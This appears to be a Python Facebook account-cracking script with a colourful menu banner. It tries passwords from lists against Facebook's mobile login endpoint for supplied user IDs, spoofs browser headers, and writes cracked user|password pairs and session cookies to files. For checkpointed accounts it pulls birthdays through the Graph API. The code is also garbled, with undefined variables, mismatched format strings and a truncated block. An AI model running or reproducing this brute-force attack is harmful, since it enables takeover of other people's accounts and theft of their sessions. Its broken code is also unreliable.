W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
from concurrent.futures import ThreadPoolExecutor

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		
logo="""
             
\033[0;91m      ___           ___           ___           ___           ___     
\033[0;92m     /\  \         /\__\         /\  \         /\  \         /\__\    
\033[0;94m    /::\  \       /:/  /        /::\  \       /::\  \       /:/  /    
\033[0;93m   /:/\:\  \     /:/__/        /:/\:\  \     /:/\ \  \     /:/__/     
\033[0;96m  /::\~\:\  \   /::\__\____   /::\~\:\  \   _\:\~\ \  \   /::\  \ ___ 
\033[0;91m /:/\:\ \:\__\ /:/\:::::\__\ /:/\:\ \:\__\ /\ \:\ \ \__\ /:/\:\  /\__\
\033[0;93m \/__\:\/:/  / \/_|:|~~|~    \/__\:\/:/  / \:\ \:\ \/__/ \/__\:\/:/  /
\033[0;96m      \::/  /     |:|  |          \::/  /   \:\ \:\__\        \::/  / 
\033[0;94m      /:/  /      |:|  |          /:/  /     \:\/:/  /        /:/  /  
\033[0;91m     /:/  /       |:|  |         /:/  /       \::/  /        /:/  /   
\033[0;95m     \/__/         \|__|         \/__/         \/__/         \/__/    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                           
        \033[1;92m༄𝐾𝑠𝑡᭄•───────────────────────────────────────•༄𝐴𝑘𝑎𝑠ℎ᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : AKASH              \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : AKASHTTC22          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : AKASH.KUSHTIA.YT           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801635795657       \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS Free          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mWELCOME MY TOOL      \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄𝑘𝑠𝑡᭄•───────────────────────────────────────•༄𝐴𝑘𝑎𝑠ℎ᭄
""" 
def hasil(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/𝐴𝐾𝐴𝑆𝐻-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/𝐴𝐾𝐴𝑆𝐻-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back 𝑀𝑎𝑖𝑛 Menu ")

	    R()

		

def R():

			os.system("clear")

			print(logo)

			print ('༄𝐾𝑠𝑡᭄•───────────────────────────────────────•༄𝐴𝑘𝑎𝑠ℎ᭄')

			print("\033[1;93m▇▇➣\033[1;92m❥❥❥❥❥❥❥  \033[1;95mSTART FILE CRACKING  : BEST METHOD🔥")

			print("\033[1;93m▇▇➣\033[1;94m❥❥❥❥❥❥❥  \033[1;94mPUBLICK AC CRACKING  : NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;95m❥❥❥❥❥❥❥  \033[1;93mUNLIMITED FILEMAKING : NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;96m❥❥❥❥❥❥❥  \033[1;92mRANDOM AC CRACKING   : NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥  \033[1;91mFOLLEW ME ON WATAAP  : NO LOGIN😓")

			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : 𝐾𝑠𝑡-𝐴𝑘𝑎𝑠ℎ")
			print ('\033[1;92m༄𝐾𝑠𝑡᭄•───────────────────────────────────────•༄𝐴𝑘𝑎𝑠ℎ᭄')
			key = input(" [*] Choose : ")
			print ('༄𝐾𝑠𝑡᭄•───────────────────────────────────────•༄𝐴𝑘𝑎𝑠ℎ᭄')

			if key in [""]:

				print (" [!] Please Select Correct Option")

				exit()

			elif key in ["1", "01"]:

				__xxx__().imtiaz(id)

			elif key in ["2", "02"]:

				

				os.system('python dump.py')

			elif key in ["3", "03"]:

				

				dupcutter()

			elif key in ["4", "04"]:

				

				os.system("xdg-open https://chat.whatsapp.com/HocCBerkiPXJC121wId8we")

				R()

			elif key in ["5", "05"]:

				time.sleep(0.5)

				yt()

				R()

				login()

			elif key in ["0", "00" , "6"]:

				time.sleep(0.5)

				exit("\n [✓] Thank You\n")

class __xxx__:

    def __init__(self):

        self.id = []

    def imtiaz(self,ak):

        if 1 in fuck:

            os.system('#')

        

      

        

        self.cnt = input(' [*] Put File Name : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [!] Choose Correct One');

            self.sarfrazx(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop

        sys.stdout.write(f"\r \x1b[1;33m[𝐴𝐾𝐴𝑆𝐻]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                header = {

                    "Host":cebok,

                    "upgrade-insecure-requests":"1",

                    "user-agent":"NokiaC5-05/22.5.007 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba+",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "dnt":"1",

                    "x-requested-with":"mark.via.gp",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://m.facebook.com/",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)

                das = {

                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),

                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),

                    "uid":user,

                    "flow":"login_no_pin",

                    "pass":pw,

                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"

                }

                header1 = {

                    "Host":cebok,

                    "cache-control":"max-age=0",

                    "upgrade-insecure-requests":"1",

                    "origin":"https://"+cebok,

                    "content-type":"application/x-www-form-urlencoded",

                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "x-requested-with":"XMLHttpRequest",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f"\r{H} [𝐴𝐾𝐴𝑆𝐻-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/𝐴𝐾𝐴𝑆𝐻_OK.txt' , 'a').write('%s\n' % wrt)

                    self.follow(session,coki)

                    break

                elif 'checkpoint' in session.cookies.get_dict():

                    try:

                        tokenz = open('.token.txt').read()

                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={token}').json()['birthday']

                        month, day, year = cp_ttl.split('/')

                        month = bulan_ttl[month]

                        

                        wrt = '%s|%s' % (use,w)

                        cp.append(wrt)

                        open('/sdcard/𝐴𝐾𝐴𝑆𝐻_CP.txt' , 'a').write('%s\n' % wrt)

                  
			
try:Main()
except Exception as e:exit(str(e))

                        
